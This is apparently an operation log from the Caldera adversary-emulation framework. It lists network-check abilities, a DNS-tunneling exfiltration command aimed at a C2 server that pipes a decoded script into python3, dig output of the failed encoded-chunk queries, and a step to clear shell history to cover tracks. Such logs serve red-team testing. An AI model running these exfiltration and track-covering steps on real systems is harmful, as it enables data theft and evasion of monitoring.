command: if ping -c 3 -W 2 192.168.1.2 > /dev/null 2>&1; then echo "LAN_REACHABLE:true"; else echo "LAN_REACHABLE:false"; false; fi
plaintext_command: if ping -c 3 -W 2 192.168.1.2 > /dev/null 2>&1; then echo "LAN_REACHABLE:true"; else echo "LAN_REACHABLE:false"; false; fi

ability_metadata.ability_description: Checks inter-network connectivity by pinging a target host on the LAN. The target IP is defined by the fact 'lan.target.ip'.

command: export _S="https://203.0.113.1:8443" _P="8853" _W="zfaerx" _F="/tmp/.dns_exfil_zfaerx"; echo "" | base64 -d | sed "s|CALDERA_SERVER|$_S|g; s|DNS_PORT|$_P|g; s|AGENT_PAW|$_W|g; s|DNS_CHUNK_FILE|$_F|g" | python3
plaintext_command: export _S="https://203.0.113.1:8443" _P="8853" _W="zfaerx" _F="/tmp/.dns_exfil_zfaerx"; echo "" | base64 -d | sed "s|CALDERA_SERVER|$_S|g; s|DNS_PORT|$_P|g; s|AGENT_PAW|$_W|g; s|DNS_CHUNK_FILE|$_F|g" | python3

ability_metadata.ability_description: Exfiltrate encoded data to the Caldera C2 server via DNS tunneling (UDP port 8853). Uses Caldera's built-in DNS contact protocol to upload the staged file chunk as DNS subdomain queries, completely bypassing HTTP egress controls.

output.stdout: ;; communications error to 203.0.113.1#8853: connection refused; <<>> DiG 9.18.39-0ubuntu0.24.04.3-Ubuntu <<>> @203.0.113.1 -p 8853 10990484.ur.0.3.7b2266696c65223a2022646e735f657866696c5f7a66616572782e646174.mycaldera.caldera A +time=5 +tries=1 +noall +answer; (1 server found);; global options: +cmd;; no servers could be reached;; communications error to 203.0.113.1#8853: connection refused; <<>> DiG 9.18.39-0ubuntu0.24.04.3-Ubuntu <<>> @203.0.113.1 -p 8853 10990484.ur.1.3.222c2022706177223a20227a6661657278222c20226469726563746f7279.mycaldera.caldera A +time=5 +tries=1 +noall +answer; (1 server found);; global options: +cmd;; no servers could be reached;; communications error to 203.0.113.1#8853: connection refused; <<>> DiG 9.18.39-0ubuntu0.24.04.3-Ubuntu <<>> @203.0.113.1 -p 8853 10990484.ur.2.3.223a2022646e735f657866696c227d.mycaldera.caldera A +time=5 +tries=1 +noall +answer; (1 server found);; global options: +cmd;; no servers could be reachedDNS_UPLOAD_REQUEST:mid=10990484 c2=203.0.113.1:8853 chunks=3DNS_UPLOAD_DATA:chunks=1CHUNK_0:rc=9DNS_EXFIL_FAILED

command: wget -q -T 4 --tries=3 --max-redirect=0 -O /dev/null http://1.1.1.1 2>/dev/null; ec=$?; if [ $ec -eq 0 -o $ec -eq 8 ]; then echo "HTTP_STATUS:200"; else echo "HTTP_STATUS:000"; false; fi
plaintext_command: wget -q -T 4 --tries=3 --max-redirect=0 -O /dev/null http://1.1.1.1 2>/dev/null; ec=$?; if [ $ec -eq 0 -o $ec -eq 8 ]; then echo "HTTP_STATUS:200"; else echo "HTTP_STATUS:000"; false; fi

ability_metadata.ability_description: Deadman ability that verifies internet connectivity by making an HTTP GET request to a well-known public endpoint. Uses wget instead of ping (ICMP) to test TCP-based network reachability. Returns the HTTP status code.
Delete local staging files and clear shell history to cover tracks
